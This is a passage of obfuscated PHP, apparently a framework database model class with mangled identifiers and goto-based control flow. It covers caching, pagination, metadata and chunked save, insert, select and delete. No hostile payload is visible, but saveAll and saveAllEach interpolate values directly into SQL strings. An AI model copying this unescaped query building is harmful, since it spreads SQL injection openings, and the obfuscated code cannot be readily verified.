call_user_func_array(array($this, $A±®ê´ÑÑ), array($cÒ‡‚í¾«¾, !0)); Cache::set($C¯Ô‚ÈˆŸ›, $Fë³á°¡ê–); } return $Fë³á°¡ê–; } public function cacheFunctionClear($a¯àÌà¿º‹, $D…÷ù‰Æ²Ö) { $DƒŸ³“áØ‘ = $D…÷ù‰Æ²Ö; if (!is_array($D…÷ù‰Æ²Ö)) { $DƒŸ³“áØ‘ = array($D…÷ù‰Æ²Ö); } foreach ($DƒŸ³“áØ‘ as $cŠÂÓ‚Ü£) { $EÄøâà  = $this->cacheKeyMake($a¯àÌà¿º‹, $cŠÂÓ‚Ü£); Cache::remove($EÄøâà ); } } private function cacheKeyMake($e¿Û½”•ÏÑ, $CÙ„Œ¢Á¥) { $bî²ºÒÎèš =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return get_class($this) . $bî²ºÒÎèš[70] . $e¿Û½”•ÏÑ . $bî²ºÒÎèš[357] . $CÙ„Œ¢Á¥; } protected function selectPage($e¥µ£ÂÆÄ = 200, $d†‘°Û»èÈ = 1) { goto C´ó™÷ï¤»; EïŞß°ÈñÈ: $eƒ–™“âÁò = 4000; $e¥µ£ÂÆÄ = isset($in[$bùÍĞ‰Ìïã[358]]) ? $in[$bùÍĞ‰Ìïã[358]] : $e¥µ£ÂÆÄ; if ($e¥µ£ÂÆÄ === -1) { unset($in[$bùÍĞ‰Ìïã[358]]); $eƒ–™“âÁò = 100000000; $e¥µ£ÂÆÄ = $eƒ–™“âÁò; } goto B´Êö…Ëó¢; Dİ˜–‹Û„º: $this->optionsValue($e¥–…š½ÉÒ); $d’¨Áéö = $this->page($d†‘°Û»èÈ, $e¥µ£ÂÆÄ)->select(); $d’¨Áéö = is_array($d’¨Áéö) ? $d’¨Áéö : array(); goto EîÃ…–ËË¢; EîÃ…–ËË¢: if ($Eïî–ÛË == 1) { $EãÏ§‚³ŒÉ = count($d’¨Áéö); } $AãÁ¤½Ü–Ù = array($bùÍĞ‰Ìïã[360] => array($bùÍĞ‰Ìïã[361] => $EãÏ§‚³ŒÉ, $bùÍĞ‰Ìïã[358] => $e¥µ£ÂÆÄ, $bùÍĞ‰Ìïã[349] => $d†‘°Û»èÈ, $bùÍĞ‰Ìïã[362] => $Eïî–ÛË), $bùÍĞ‰Ìïã[363] => $d’¨Áéö ? $d’¨Áéö : array()); return $AãÁ¤½Ü–Ù; goto aÀÇ†‘Å¬; b¤Œì¤ğ‘È: $Eïî–ÛË = ceil($EãÏ§‚³ŒÉ / $e¥µ£ÂÆÄ); $d†‘°Û»èÈ = intval(isset($in[$bùÍĞ‰Ìïã[349]]) ? $in[$bùÍĞ‰Ìïã[349]] : $d†‘°Û»èÈ); $d†‘°Û»èÈ = $d†‘°Û»èÈ <= 1 ? 1 : ($d†‘°Û»èÈ >= $Eïî–ÛË ? $Eïî–ÛË : $d†‘°Û»èÈ); goto Dİ˜–‹Û„º; B´Êö…Ëó¢: $f”îùÈå¥¯ = $e¥–…š½ÉÒ; $f”îùÈå¥¯[$bùÍĞ‰Ìïã[359]] = array(); $this->optionsValue($f”îùÈå¥¯); goto e†æŞÛ‰·; C´ó™÷ï¤»: $bùÍĞ‰Ìïã =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; global $in; $e¥–…š½ÉÒ = $this->optionsValue(); goto EïŞß°ÈñÈ; e†æŞÛ‰·: $EãÏ§‚³ŒÉ = intval($this->count()); $e¥µ£ÂÆÄ = intval($e¥µ£ÂÆÄ); $e¥µ£ÂÆÄ = $e¥µ£ÂÆÄ <= 5 ? 5 : ($e¥µ£ÂÆÄ >= $eƒ–™“âÁò ? $eƒ–™“âÁò : $e¥µ£ÂÆÄ); goto b¤Œì¤ğ‘È; aÀÇ†‘Å¬: } protected function checkLength($e˜±Øğ, $bøÚ•ÅÏà´ = 0, $E§µŸĞÒá´ = '') { $BåÎ±ó¡†“ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bøÚ•ÅÏà´ = $bøÚ•ÅÏà´ ? $bøÚ•ÅÏà´ : 65536; if (!$e˜±Øğ || strlen($e˜±Øğ) < $bøÚ•ÅÏà´) { return; } $E§µŸĞÒá´ = $E§µŸĞÒá´ ? $E§µŸĞÒá´ . $BåÎ±ó¡†“[67] : $BåÎ±ó¡†“[33]; show_json($E§µŸĞÒá´ . LNG($BåÎ±ó¡†“[364]) . "\x28{$bøÚ•ÅÏà´}\x29", !1); } protected function metaSet($c¨Ù˜‰¼‘, $F¶‡œ˜¢¸ = null, $Bâ¬…•›æ = null) { goto CÙ”ùÒ³µß; CÙ”ùÒ³µß: $B³ÉßÏƒê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->tableMeta || !$c¨Ù˜‰¼‘) { return !1; } $eæŠë®¡¢… = $this->tableMeta[$B³ÉßÏƒê[365]]; goto BÌ„…ÂÃÉ; dÅÂµÃø: if (is_null($F¶‡œ˜¢¸)) { return $cÃîŒòçéˆ->where(array($eæŠë®¡¢… => $c¨Ù˜‰¼‘))->delete(); } if (is_null($Bâ¬…•›æ) && is_string($F¶‡œ˜¢¸)) { return $cÃîŒòçéˆ->where($CöàÌÛ†Õİ)->delete(); } $fóéõ†Ú²å = is_array($F¶‡œ˜¢¸) ? $F¶‡œ˜¢¸ : array(); goto bŠÎàçÆ†Á; BÌ„…ÂÃÉ: $aùƒµ¾Ùß˜ = $this->tableMeta[$B³ÉßÏƒê[366]]; $cÃîŒòçéˆ = Model($aùƒµ¾Ùß˜); $CöàÌÛ†Õİ = array($eæŠë®¡¢… => $c¨Ù˜‰¼‘, $B³ÉßÏƒê[367] => $F¶‡œ˜¢¸); goto dÅÂµÃø; Bºª£êâ·«: $cÃîŒòçéˆ->where(array($eæŠë®¡¢… => $c¨Ù˜‰¼‘))->addAll($F´Ï„†¡Ü, array(), !0); return !0; goto C²½Ş  ×Å; bŠÎàçÆ†Á: if (is_string($F¶‡œ˜¢¸)) { $fóéõ†Ú²å[$F¶‡œ˜¢¸] = $Bâ¬…•›æ; } $F´Ï„†¡Ü = array(); foreach ($fóéõ†Ú²å as $bÅ¢Ù¸òĞŠ => $d¬¹–›µê°) { $this->checkLength($d¬¹–›µê°, !1, $aùƒµ¾Ùß˜ . $B³ÉßÏƒê[4] . $bÅ¢Ù¸òĞŠ); $F´Ï„†¡Ü[] = array($eæŠë®¡¢… => $c¨Ù˜‰¼‘, $B³ÉßÏƒê[92] => $bÅ¢Ù¸òĞŠ, $B³ÉßÏƒê[368] => $d¬¹–›µê°); } goto Bºª£êâ·«; C²½Ş  ×Å: } public function metaGet($aˆá¸‡âÊË, $aÚ“¶åâ“æ = false) { goto D³åÌÓô¥; B“òéÇè¡: $E¾¬åÑİ‹ = $BõÑÖÅ™Ò->field($CßË›ù´’[369])->where($a‰ƒ»êÀÃØ)->select(); $E¾¬åÑİ‹ = array_to_keyvalue($E¾¬åÑİ‹, $CßË›ù´’[92], $CßË›ù´’[368]); return $E¾¬åÑİ‹; goto Eå¨¬Æ¦¹Œ; D³åÌÓô¥: $CßË›ù´’ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->tableMeta) { return array(); } $e¨Ù´â‘¦ = $this->tableMeta[$CßË›ù´’[365]]; goto FÎº†îö; FÎº†îö: $BõÑÖÅ™Ò = Model($this->tableMeta[$CßË›ù´’[366]]); if ($aÚ“¶åâ“æ) { $a‰ƒ»êÀÃØ = array($e¨Ù´â‘¦ => $aˆá¸‡âÊË, $CßË›ù´’[92] => $aÚ“¶åâ“æ); return $BõÑÖÅ™Ò->where($a‰ƒ»êÀÃØ)->getField($CßË›ù´’[368]); } $a‰ƒ»êÀÃØ = array($e¨Ù´â‘¦ => $aˆá¸‡âÊË); goto B“òéÇè¡; Eå¨¬Æ¦¹Œ: } private function checkDataAutoHas($E®ŞéŸóË†) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Eœµñ¶õ—) { if (in_array($E®ŞéŸóË†, explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][47], $Eœµñ¶õ—[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ašİóè–³, $D¬ÏøŒÂÉ„) { $C›ÛæÃƒË‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($this->dataAuto as $c«›‹ìŸ…‰) { $A…•±Ì¡¤÷ = $c«›‹ìŸ…‰[0]; if (!in_array($D¬ÏøŒÂÉ„, explode($C›ÛæÃƒË‹[47], $c«›‹ìŸ…‰[2]))) { continue; } switch (trim($c«›‹ìŸ…‰[3])) { case $C›ÛæÃƒË‹[317]: case $C›ÛæÃƒË‹[318]: $e ³ì¾ëö” = $c«›‹ìŸ…‰[1]; $B±˜‘´‚ = isset($c«›‹ìŸ…‰[4]) ? (array) $c«›‹ìŸ…‰[4] : array(); if ($e ³ì¾ëö” == $C›ÛæÃƒË‹[195] && array_key_exists($A…•±Ì¡¤÷, $ašİóè–³)) { if (!$ašİóè–³[$A…•±Ì¡¤÷]) { unset($ašİóè–³[$A…•±Ì¡¤÷]); } break; } if (isset($ašİóè–³[$A…•±Ì¡¤÷])) { array_unshift($B±˜‘´‚, $ašİóè–³[$A…•±Ì¡¤÷]); } if ($C›ÛæÃƒË‹[317] == $c«›‹ìŸ…‰[3]) { $ašİóè–³[$A…•±Ì¡¤÷] = call_user_func_array($e ³ì¾ëö”, $B±˜‘´‚); } else { $ašİóè–³[$A…•±Ì¡¤÷] = call_user_func_array(array(&$this, $e ³ì¾ëö”), $B±˜‘´‚); } break; case $C›ÛæÃƒË‹[269]: $ašİóè–³[$A…•±Ì¡¤÷] = $ašİóè–³[$c«›‹ìŸ…‰[1]]; break; case $C›ÛæÃƒË‹[290]: if (isset($ašİóè–³[$A…•±Ì¡¤÷]) && !is_string($ašİóè–³[$A…•±Ì¡¤÷])) { $ašİóè–³[$A…•±Ì¡¤÷] = json_encode_force($ašİóè–³[$A…•±Ì¡¤÷]); } break; case $C›ÛæÃƒË‹[319]: if ($ašİóè–³[$A…•±Ì¡¤÷] === $C›ÛæÃƒË‹[33]) { unset($ašİóè–³[$A…•±Ì¡¤÷]); } break; case $C›ÛæÃƒË‹[320]: $ašİóè–³[$A…•±Ì¡¤÷] = $c«›‹ìŸ…‰[1]; default: break; } } if ($D¬ÏøŒÂÉ„ == $C›ÛæÃƒË‹[353]) { $c«ˆÂªğÇÇ = strtolower($this->db->getDbType()); if (strpos($c«ˆÂªğÇÇ, $C›ÛæÃƒË‹[9]) !== 0) { return; } $dêËÜÒµã¡ = $this->field(!0)->fields; $e½×”½ŠÓ“ = $dêËÜÒµã¡[$C›ÛæÃƒË‹[248]]; if (isset($dêËÜÒµã¡[$C›ÛæÃƒË‹[247]])) { unset($e½×”½ŠÓ“[$dêËÜÒµã¡[$C›ÛæÃƒË‹[247]]]); } foreach ($e½×”½ŠÓ“ as $bÜõÒáÉ‰“ => $D¬ÏøŒÂÉ„) { if (!isset($ašİóè–³[$bÜõÒáÉ‰“])) { $ašİóè–³[$bÜõÒáÉ‰“] = $C›ÛæÃƒË‹[33]; } } } } private function dataAfterFilter(&$bŠ™¢¦ƒîÅ) { $C„‹²µİê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($this->dataAuto as $aÍÈÊİêŠ) { $AáÌ±ğïÏ– = $aÍÈÊİêŠ[0]; if (!in_array($C„‹²µİê[355], explode($C„‹²µİê[47], $aÍÈÊİêŠ[2]))) { continue; } if (!isset($bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–])) { continue; } switch (trim($aÍÈÊİêŠ[3])) { case $C„‹²µİê[317]: case $C„‹²µİê[318]: $a–š‰ˆÃÈŠ = isset($aÍÈÊİêŠ[4]) ? (array) $aÍÈÊİêŠ[4] : array(); array_unshift($a–š‰ˆÃÈŠ, $bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–]); if ($C„‹²µİê[317] == $aÍÈÊİêŠ[3]) { $bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–] = call_user_func_array($aÍÈÊİêŠ[1], $a–š‰ˆÃÈŠ); } else { $bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–] = call_user_func_array(array(&$this, $aÍÈÊİêŠ[1]), $a–š‰ˆÃÈŠ); } break; case $C„‹²µİê[269]: $bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–] = $bŠ™¢¦ƒîÅ[$aÍÈÊİêŠ[1]]; break; case $C„‹²µİê[290]: $F½Šš²Æ¯ = $bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–]; $bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–] = json_decode($F½Šš²Æ¯, !0); if (is_null($bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–])) { $bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–] = $F½Šš²Æ¯; } break; case $C„‹²µİê[319]: if ($bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–] === $C„‹²µİê[33]) { unset($bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–]); } break; case $C„‹²µİê[320]: $bŠ™¢¦ƒîÅ[$AáÌ±ğïÏ–] = $aÍÈÊİêŠ[1]; default: break; } } } public function saveAll($A¦çë¢Ùé¬) { goto F§Éƒ³µ¬ƒ; fÏ­õõöËŸ: $D¡ƒåÕòÏÊ = array(); $fè—£Œ…× = count($A¦çë¢Ùé¬); for ($bâ›ÌÉÍÍ = 0; $bâ›ÌÉÍÍ < $fè—£Œ…×; $bâ›ÌÉÍÍ++) { $CôÈÒÖêÃÙ = $A¦çë¢Ùé¬[$bâ›ÌÉÍÍ]; if (!is_array($CôÈÒÖêÃÙ) || count($CôÈÒÖêÃÙ) != 4) { continue; } $FÊ¹·§ğ­ = "\125\x50\104\x41\x54\105\40\x60{$a¾†¯ìÒ…°}\140\x20\x53\105\124\40{$CôÈÒÖêÃÙ[2]}\40\x3d\40\x43\101\x53\x45\40{$CôÈÒÖêÃÙ[0]}\40\xa"; if ($aª‚‡ÖÚ²º == 0) { $E½¡ó¥Õ÷ = $FÊ¹·§ğ­; } $D¡ƒåÕòÏÊ[] = $A¬í¾¤¥ÜÜ[115] . $CôÈÒÖêÃÙ[1] . $A¬í¾¤¥ÜÜ[115]; $aª‚‡ÖÚ²º++; $E½¡ó¥Õ÷ .= "\40\x57\x48\105\116\40\x27{$CôÈÒÖêÃÙ[1]}\x27\40\124\110\x45\116\40\47{$CôÈÒÖêÃÙ[3]}\47\x20\xa"; if ($aª‚‡ÖÚ²º == $e³òŠëº° || $bâ›ÌÉÍÍ == $fè—£Œ…× - 1) { goto d¸Şáš¯¥å; dñ¶‰¤ÃÖ‹: $aª‚‡ÖÚ²º = 0; $E½¡ó¥Õ÷ = $FÊ¹·§ğ­; $this->chunkEventCheck(count($D¡ƒåÕòÏÊ)); goto fñš—ÏÍ³È; d¸Şáš¯¥å: $B›Âò£´É˜ = implode($A¬í¾¤¥ÜÜ[47], $D¡ƒåÕòÏÊ); $E½¡ó¥Õ÷ .= "\x20\x45\x4e\x44\40\x20\127\x48\x45\122\105\40{$CôÈÒÖêÃÙ[0]}\40\x49\116\40\x28{$B›Âò£´É˜}\x29\x20"; $this->execute($E½¡ó¥Õ÷); goto dñ¶‰¤ÃÖ‹; fñš—ÏÍ³È: $D¡ƒåÕòÏÊ = array(); goto EËâÀÎçãÅ; EËâÀÎçãÅ: } } goto Fä©Ôòä»™; F§Éƒ³µ¬ƒ: $A¬í¾¤¥ÜÜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a¾†¯ìÒ…° = $this->tablePrefix . $this->tableName; $e³òŠëº° = self::SQL_WHERE_IN_CHUNK; goto a…êÀ¤©¹; a…êÀ¤©¹: $A¦çë¢Ùé¬ = is_array($A¦çë¢Ùé¬) ? $A¦çë¢Ùé¬ : array(); $E½¡ó¥Õ÷ = $A¬í¾¤¥ÜÜ[370]; $aª‚‡ÖÚ²º = 0; goto fÏ­õõöËŸ; Fä©Ôòä»™: $this->chunkEventSet(); goto eÒ¨Ã×˜¿Ò; eÒ¨Ã×˜¿Ò: } public function saveAllEach($D˜»÷Ï¦Ì) { $CĞ İ‡â¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $càÏóš§î = $this->tablePrefix . $this->tableName; foreach ($D˜»÷Ï¦Ì as $A²©’¤íáª) { if (!is_array($A²©’¤íáª) || count($A²©’¤íáª) != 4) { continue; } $aµ¢±‡Õ£ˆ = $A²©’¤íáª[0] . $CĞ İ‡â¾[371] . $A²©’¤íáª[1] . $CĞ İ‡â¾[115]; $cÉÜŠ·Ùë = $A²©’¤íáª[2] . $CĞ İ‡â¾[371] . $A²©’¤íáª[3] . $CĞ İ‡â¾[115]; $BĞõ£ñÅÓ = "\x75\160\x64\141\164\x65\40{$càÏóš§î}\x20\x73\145\164\x20{$cÉÜŠ·Ùë}\40\x77\x68\x65\x72\145\x20{$aµ¢±‡Õ£ˆ}\x3b"; $this->execute($BĞõ£ñÅÓ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($f«õ†Æ¯ªŞ = false, $EìÂ›¶ïË = false) { $this->_chunkEvent = $f«õ†Æ¯ªŞ; $this->_chunkEventParam = $EìÂ›¶ïË; } private function chunkEventCheck($BêÓ§î×Íö) { if (!$this->_chunkEvent) { return; } $F¨›©ÖŞ‹Í = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $F¨›©ÖŞ‹Í[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][372]] = $BêÓ§î×Íö; Hook::trigger($this->_chunkEvent, $F¨›©ÖŞ‹Í); } public function addAll($AÄÜÂË¤ƒ, $A¢½Ï‘ª¯ = array(), $Cùòóó¢µ = false) { goto c—åò¾‡«É; BÑ›ëõ’’Û: if (empty($AÄÜÂË¤ƒ)) { $this->error = think_lang($d¥ßåè‚Úˆ[267]); return !1; } $A¢½Ï‘ª¯ = $this->_parseOptions($A¢½Ï‘ª¯); foreach ($AÄÜÂË¤ƒ as $BÑ¹’Ê¯ÙÏ => $a—Ì¶ğéö¤) { $AÄÜÂË¤ƒ[$BÑ¹’Ê¯ÙÏ] = $this->_facade($a—Ì¶ğéö¤); $this->_beforeInsert($AÄÜÂË¤ƒ[$BÑ¹’Ê¯ÙÏ], $A¢½Ï‘ª¯); } goto FÀ…«›ÎµÉ; FÀ…«›ÎµÉ: if (method_exists($this->db, $d¥ßåè‚Úˆ[268])) { for ($fÀ˜Ğ“è¶Ë = 0; $fÀ˜Ğ“è¶Ë < count($AÄÜÂË¤ƒ); $fÀ˜Ğ“è¶Ë += $FÙÇµ­ä¹ã) { $Bˆ¥îÂµƒ = array_slice($AÄÜÂË¤ƒ, $fÀ˜Ğ“è¶Ë, $FÙÇµ­ä¹ã); if (!is_array($Bˆ¥îÂµƒ) || count($Bˆ¥îÂµƒ) == 0) { break; } $bƒ’±´£ñ¨ = $this->db->insertAll($Bˆ¥îÂµƒ, $A¢½Ï‘ª¯, $Cùòóó¢µ); $this->chunkEventCheck(count($Bˆ¥îÂµƒ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($AÄÜÂË¤ƒ as $BÑ¹’Ê¯ÙÏ => $a—Ì¶ğéö¤) { $bƒ’±´£ñ¨ = $this->db->insert($a—Ì¶ğéö¤, $A¢½Ï‘ª¯, $Cùòóó¢µ); } $this->commit(); } if (!1 !== $bƒ’±´£ñ¨) { $aŸˆ»¨‰±ä = $this->getLastInsID(); if ($aŸˆ»¨‰±ä) { return $aŸˆ»¨‰±ä; } } return $bƒ’±´£ñ¨; goto d—¸ÓÁÄèñ; c—åò¾‡«É: $d¥ßåè‚Úˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; ignore_timeout(); $FÙÇµ­ä¹ã = self::SQL_WHERE_IN_CHUNK; goto BÑ›ëõ’’Û; d—¸ÓÁÄèñ: } public function save($Fó‹Œëµ‡ = '', $d‰Ñ¾Šèò = array()) { goto fÒˆ‰Ñ¾¶…; eƒ†º†§•: for ($Aâíä©›Ä = 0; $Aâíä©›Ä < $E´Å¡õ‰ˆç; $Aâíä©›Ä += $f•ÆÁ’–ƒÌ) { $c±‹÷ìÙ‡ = array_slice($eˆîáø­«, $Aâíä©›Ä, $f•ÆÁ’–ƒÌ); if (!is_array($c±‹÷ìÙ‡) || count($c±‹÷ìÙ‡) == 0) { break; } $Dˆ£ÍŒŠ˜¹[$F‰Ä±Ë‰ÕŒ[271]][$cÌ¹²–‡ôë][1] = $c±‹÷ìÙ‡; $this->optionsValue($Dˆ£ÍŒŠ˜¹); $DÆìùøìè½ += parent::save($Fó‹Œëµ‡, $d‰Ñ¾Šèò); $this->chunkEventCheck(count($c±‹÷ìÙ‡)); } $this->chunkEventSet(); return $DÆìùøìè½; goto A‚¢†¯¾Šº; fÒˆ‰Ñ¾¶…: $F‰Ä±Ë‰ÕŒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f•ÆÁ’–ƒÌ = self::SQL_WHERE_IN_CHUNK; $Dˆ£ÍŒŠ˜¹ = $this->optionsValue(); goto E’ŒÅ’ÛÑ; c¿²–¥í´Ù: $eˆîáø­« = $Dˆ£ÍŒŠ˜¹[$F‰Ä±Ë‰ÕŒ[271]][$cÌ¹²–‡ôë][1]; $eˆîáø­« = is_array($eˆîáø­«) ? $eˆîáø­« : array(); $E´Å¡õ‰ˆç = count($eˆîáø­«); goto eƒ†º†§•; E’ŒÅ’ÛÑ: $cÌ¹²–‡ôë = $this->findWhereField($Dˆ£ÍŒŠ˜¹); if (!$cÌ¹²–‡ôë) { return parent::save($Fó‹Œëµ‡, $d‰Ñ¾Šèò); } $DÆìùøìè½ = 0; goto c¿²–¥í´Ù; A‚¢†¯¾Šº: } public function add($EİŠƒÎ–˜® = '', $DØæº‡¼Œ = array(), $bï±–¼òõ£ = false) { if ($this->addTaskStatus && is_array($EİŠƒÎ–˜®)) { $this->addTaskData[] = $EİŠƒÎ–˜®; return; } return parent::add($EİŠƒÎ–˜®, $DØæº‡¼Œ, $bï±–¼òõ£); } public function parseWhereLike($B¥Û²ÆâÇæ, $Dô›Ãåö¸š = '', $Bó†“Í‹ä´ = false, &$C’®Æí‚¼Ú = false) { goto a¦»Àì§íî; fÃàôÛÍ³Ø: foreach ($B¥Û²ÆâÇæ as $b²…½İ‡Œ® => $dÉÄêºœÃÊ) { if (is_array($dÉÄêºœÃÊ) && count($dÉÄêºœÃÊ) == 2 && $dÉÄêºœÃÊ[0] == $BÅÍâ½¡„„[375] && is_string($dÉÄêºœÃÊ[1]) && substr($dÉÄêºœÃÊ[1], 0, 1) == $BÅÍâ½¡„„[376] && substr($dÉÄêºœÃÊ[1], strlen($dÉÄêºœÃÊ[1]) - 1, 1) == $BÅÍâ½¡„„[376]) { goto B‘¢©Ìù¼ß; eš‘ ñŞ°Ê: $Bå¶–›š³· = $this->db->escapeString($Bå¶–›š³·); if (!strpos($d¨‹¬”Œ‰, $BÅÍâ½¡„„[94])) { $d¨‹¬”Œ‰ = $BÅÍâ½¡„„[377] . $d¨‹¬”Œ‰ . $BÅÍâ½¡„„[377]; } if ($A®Ê¾„½è„[$BÅÍâ½¡„„[378]]) { $Bå¶–›š³· = $BÅÍâ½¡„„[115] . $Bå¶–›š³· . $BÅÍâ½¡„„[115]; } goto bŒŞŠŒÜà; B‘¢©Ìù¼ß: $C’®Æí‚¼Ú = !0; $d¨‹¬”Œ‰ = is_string($b²…½İ‡Œ®) ? $b²…½İ‡Œ® : $Dô›Ãåö¸š; $Bå¶–›š³· = substr($dÉÄêºœÃÊ[1], 1, strlen($dÉÄêºœÃÊ[1]) - 2); goto eš‘ ñŞ°Ê; bŒŞŠŒÜà: $A­ÇÃëÀœó[$aÚŠÎî·„æ] = $BÅÍâ½¡„„[379] . $d¨‹¬”Œ‰ . $BÅÍâ½¡„„[380] . $Bå¶–›š³· . $BÅÍâ½¡„„[381]; $aÚŠÎî·„æ++; continue; goto AÓ …í¯°ß; AÓ …í¯°ß: } if (is_array($dÉÄêºœÃÊ)) { $Dô›Ãåö¸š = is_string($b²…½İ‡Œ®) ? $b²…½İ‡Œ® : $Dô›Ãåö¸š; $dÉÄêºœÃÊ = $this->parseWhereLike($dÉÄêºœÃÊ, $Dô›Ãåö¸š, !0, $C’®Æí‚¼Ú); } if (is_numeric($b²…½İ‡Œ®)) { $A­ÇÃëÀœó[$aÚŠÎî·„æ] = $dÉÄêºœÃÊ; $aÚŠÎî·„æ++; } else { $A­ÇÃëÀœó[$b²…½İ‡Œ®] = $dÉÄêºœÃÊ; } } if ($C’®Æí‚¼Ú && !$Bó†“Í‹ä´) { trace_log(array($A­ÇÃëÀœó, $B¥Û²ÆâÇæ), $BÅÍâ½¡„„[271]); } return $A­ÇÃëÀœó; goto fôºñ¥‰; a¦»Àì§íî: $BÅÍâ½¡„„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A®Ê¾„½è„ = $GLOBALS[$BÅÍâ½¡„„[6]][$BÅÍâ½¡„„[373]]; if (!$A®Ê¾„½è„[$BÅÍâ½¡„„[374]]) { return $B¥Û²ÆâÇæ; } goto fÜñ ñ’; fÜñ ñ’: if (!is_array($B¥Û²ÆâÇæ)) { return $B¥Û²ÆâÇæ; } $A­ÇÃëÀœó = array(); $aÚŠÎî·„æ = 0; goto fÃàôÛÍ³Ø; fôºñ¥‰: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($fìÃñÆĞ…÷ = array()) { goto d¶çÏ ¯‡î; e†„¾ŒŒ™: $fÑßòÕ­š‰ = $this->findWhereField($aë’ÌÖÖù); if (!$fÑßòÕ­š‰ || isset($aë’ÌÖÖù[$C¾ÑáõÙ˜Ä[288]]) || isset($aë’ÌÖÖù[$C¾ÑáõÙ˜Ä[349]])) { return parent::select($fìÃñÆĞ…÷); } $B£ì‡ê±· = $aë’ÌÖÖù[$C¾ÑáõÙ˜Ä[271]][$fÑßòÕ­š‰][1]; goto bèÄëêåÎš; d¶çÏ ¯‡î: $C¾ÑáõÙ˜Ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fèãÃ¿ñÀ¶ = self::SQL_WHERE_IN_CHUNK; $aë’ÌÖÖù = $this->optionsValue(); goto e†„¾ŒŒ™; bèÄëêåÎš: $B£ì‡ê±· = is_array($B£ì‡ê±·) ? $B£ì‡ê±· : array(); $Bä÷¥¢…· = null; for ($DË´‹£¢İè = 0; $DË´‹£¢İè < count($B£ì‡ê±·); $DË´‹£¢İè += $fèãÃ¿ñÀ¶) { $dÌÁ“Ã¾¶ = array_slice($B£ì‡ê±·, $DË´‹£¢İè, $fèãÃ¿ñÀ¶); if (!is_array($dÌÁ“Ã¾¶) || count($dÌÁ“Ã¾¶) == 0) { break; } $aë’ÌÖÖù[$C¾ÑáõÙ˜Ä[271]][$fÑßòÕ­š‰][1] = $dÌÁ“Ã¾¶; $this->optionsValue($aë’ÌÖÖù); $BèåÛ‘âˆê = parent::select($fìÃñÆĞ…÷); if (!$BèåÛ‘âˆê) { continue; } if (is_null($Bä÷¥¢…·)) { $Bä÷¥¢…· = array(); } $Bä÷¥¢…· = array_merge($Bä÷¥¢…·, $BèåÛ‘âˆê); } goto FÀ®ÃæªÂ; FÀ®ÃæªÂ: return $Bä÷¥¢…·; goto F Áìæ¯¿‡; F Áìæ¯¿‡: } public function delete($F‘î Úß¼¯ = array()) { goto C¢åî™‚ñš; cŠßÂéÁ¼É: return $E•‚Ï¾ˆ¦­; goto bÎÜ×Úíê; C¢åî™‚ñš: $DÉ¢°ƒ¬®ª =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EÌğ¬µĞ©Ö = self::SQL_WHERE_IN_CHUNK; $cÏî×İ·šî = $this->optionsValue(); goto A’¿‡¯‡Í¨; fñ™õŞöÏˆ: $BÂê£¸çÛÃ = $cÏî×İ·šî[$DÉ¢°ƒ¬®ª[271]][$CÖÆ£øËò][1]; $BÂê£¸çÛÃ = is_array($BÂê£¸çÛÃ) ? $BÂê£¸çÛÃ : array(); for ($B¨Œœ ğ‘Û = 0; $B¨Œœ ğ‘Û < count($BÂê£¸çÛÃ); $B¨Œœ ğ‘Û += $EÌğ¬µĞ©Ö) { $cÎ”ïŠİÆ = array_slice($BÂê£¸çÛÃ, $B¨Œœ ğ‘Û, $EÌğ¬µĞ©Ö); if (!is_array($cÎ”ïŠİÆ) || count($cÎ”ïŠİÆ) == 0) { break; } $cÏî×İ·šî[$DÉ¢°ƒ¬®ª[271]][$CÖÆ£øËò][1] = $cÎ”ïŠİÆ; $this->optionsValue($cÏî×İ·šî); $E•‚Ï¾ˆ¦­ += parent::delete($F‘î Úß¼¯); } goto cŠßÂéÁ¼É; A’¿‡¯‡Í¨: $CÖÆ£øËò = $this->findWhereField($cÏî×İ·šî); if (!$CÖÆ£øËò) { return parent::delete($F‘î Úß¼¯); } $E•‚Ï¾ˆ¦­ = 0; goto fñ™õŞöÏˆ; bÎÜ×Úíê: } private function findWhereField($cĞµœÚá¨) { $AŒ•†ğŒ™ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eœôá›É = self::SQL_WHERE_IN_CHUNK; if (!is_array($cĞµœÚá¨) || !is_array($cĞµœÚá¨[$AŒ•†ğŒ™[271]])) { return !1; } foreach ($cĞµœÚá¨[$AŒ•†ğŒ™[271]] as $E’à¡Ï”‘Ë => $bŠ…æÉ¢ƒÈ) { if 